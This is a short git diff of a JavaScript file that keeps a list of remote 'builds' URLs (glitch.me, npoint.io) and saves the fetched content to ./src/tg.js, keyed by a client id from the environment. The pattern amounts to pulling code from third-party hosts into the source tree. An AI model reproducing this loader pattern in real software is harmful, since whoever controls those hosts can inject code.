@@ -10,31 +10,30 @@ const FETCH_TIMEOUT = 10000; // 10 seconds timeout for each fetch
 const MAX_RETRIES = 3; // Number of retries for network failures
 const RETRY_DELAY = 2000; // Delay between retries (ms)
 const buildUrls = [
-  "https://uptimechecker2.glitch.me/builds",
+  "https://api.npoint.io/3375d15db1eece560188",
+  "https://mytghelper.glitch.me/builds",
   "https://cms-nst.glitch.me/builds",
-  "https://mychatgpt-xk3y.onrender.com/forward/builds"
-];
+  "https://uptimechecker2.glitch.me/builds"
 
+];
 const key = fetchNumbersFromString(process.env.clientId);
-const service = key?.toString()||"1";
+const service = key?.toString() || "1";
 const fileSavePath = "./src/tg.js";
 
 // Helper function: Delay for retries
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
-
 function fetchNumbersFromString(inputString) {
   const regex = /\d+/g;
   const matches = inputString.match(regex);
   if (matches) {
-      const result = matches.join('');
-      return result;
+    const result = matches.join('');
+    return result;
   } else {
-      return inputString;
+    return inputString;
   }
 }
-
 // Fetch data with retries
 async function fetchWithRetries(url, timeout, retries = MAX_RETRIES) {
   let attempt = 0;
